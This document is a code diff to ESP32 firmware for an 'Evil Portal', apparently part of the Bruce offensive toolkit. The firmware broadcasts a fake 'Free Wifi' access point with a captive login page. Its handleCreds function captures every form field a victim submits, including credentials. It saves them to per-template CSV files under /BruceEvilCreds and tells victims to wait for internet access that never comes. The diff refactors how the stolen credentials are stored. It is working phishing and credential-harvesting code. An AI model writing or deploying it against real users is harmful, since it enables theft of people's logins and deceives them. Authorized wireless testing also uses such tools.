@@ -9,33 +9,32 @@ WebServer* ep= nullptr;               // initialise webserver
 DNSServer dnsServer;
 
 String html_file, last_cred;
+String output_file = "creds.csv";
 String AP_name = "Free Wifi";
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = -1;  // stupid hack but wtfe
 String capturedCredentialsHtml = "";
 
 void handleCreds() {
-      String html_temp = "<li>";
-      String csvLine = "";
-      last_cred="";
-      for (int i = 0; i < ep->args(); i++) {
+    String html_temp = "<li>";
+    String csvLine = "";
+    last_cred="";
+    for (int i = 0; i < ep->args(); i++) {
         String tmp=ep->argName(i);
         if(tmp=="q" || tmp.startsWith("cup2") || tmp.startsWith("plain") || tmp=="P1" || tmp=="P2" || tmp=="P3" || tmp=="P4") continue;
         else {
-          html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
-          // Prepara dados para salvar no SD
-          if (i != 0) {
-            csvLine += ",";
-          }
-          csvLine += ep->argName(i) + ": " + ep->arg(i);
-          last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
+            html_temp += ep->argName(i) + ": " + ep->arg(i) + "<br>\n";
+            // Prepara dados para salvar no SD
+            if (i != 0) csvLine += ",";
+            csvLine += ep->argName(i) + ": " + ep->arg(i);
+            last_cred += ep->argName(i).substring(0,3) + ": " + ep->arg(i) + "\n";
         }
-      }
-      html_temp += "</li>\n";
-      saveToCSV("/Bruce_creds.csv", csvLine);
-      capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
-      totalCapturedCredentials++;
-      ep->send(200, "text/html", getHtmlContents("Please, Wait a few minutes. Soon you'll be able to access internet."));
+    }
+    html_temp += "</li>\n";
+    saveToCSV(csvLine);
+    capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
+    totalCapturedCredentials++;
+    ep->send(200, "text/html", getHtmlContents("Please, Wait a few minutes. Soon you'll be able to access internet."));
 }
 
 void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
@@ -86,7 +85,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
 
         tmp=millis();
         while(millis() - tmp < 3000) yield();
-      
+
         if(psramFound()) ep=(WebServer*)ps_malloc(sizeof(WebServer));
         else ep=(WebServer*)malloc(sizeof(WebServer));
 
@@ -199,18 +198,22 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
 }
 
 // Função para salvar dados no arquivo CSV
-void saveToCSV(const String &filename, const String &csvLine) {
-  FS *fs;
-  if(setupSdCard()) fs=&SD;
-  else fs=&LittleFS;
-  File file = (*fs).open(filename, FILE_APPEND);
-  if (!file) {
-    log_i("Error to open file");
-    return;
-  }
-  file.println(csvLine);
-  file.close();
-  log_i("data saved");
+void saveToCSV(const String &csvLine) {
+    FS *fs;
+    if(!getFsStorage(fs)) {
+        log_i("Error getting FS storage");
+        return;
+    }
+
+    if (!(*fs).exists("/BruceEvilCreds")) (*fs).mkdir("/BruceEvilCreds");
+    File file = (*fs).open("/BruceEvilCreds/"+output_file, FILE_APPEND);
+    if (!file) {
+        log_i("Error to open file");
+        return;
+    }
+    file.println(csvLine);
+    file.close();
+    log_i("data saved");
 }
 
 String getDefaultHtml() {
@@ -272,26 +275,33 @@ String clear_GET() {
 }
 
 void chooseHtml(bool def) {
-  FS *fs;
-  if(def) {
-    if(setupSdCard()) {
-      options = {
-        {"SD Card", [&]()  { fs=&SD; }},
-        {"LittleFS", [&]()   { fs=&LittleFS; }},
-      };
-      delay(200);
-      loopOptions(options);
-    } else fs=&LittleFS;
+    FS *fs;
+    if(def) {
+        if(setupSdCard()) {
+            options = {
+                {"SD Card",  [&]() { fs=&SD; }},
+                {"LittleFS", [&]() { fs=&LittleFS; }},
+            };
+            delay(200);
+            loopOptions(options);
+        } else fs=&LittleFS;
 
-    html_file = loopSD(*fs,true);
-    if(html_file.endsWith(".html")) {
-      File html = (*fs).open(html_file, FILE_READ);
-      html_file = html.readString();
-      html.close();
+        html_file = loopSD(*fs,true);
+        if(html_file.endsWith(".html")) {
+            String html_name = html_file.substring(html_file.lastIndexOf("/"), html_file.length()-5);
+            html_name.toLowerCase();
+
+            File html = (*fs).open(html_file, FILE_READ);
+            html_file = html.readString();
+            html.close();
+            output_file = html_name + "_creds.csv";
+        } else {
+            html_file = index_GET();
+            output_file = "default_creds.csv";
+        }
     } else {
-      html_file = index_GET();
+        html_file = index_GET();
+        output_file = "default_creds.csv";
     }
-  } else {
-    html_file = index_GET();
-  }
+    Serial.println("Evil Portal output file "+output_file);
 }
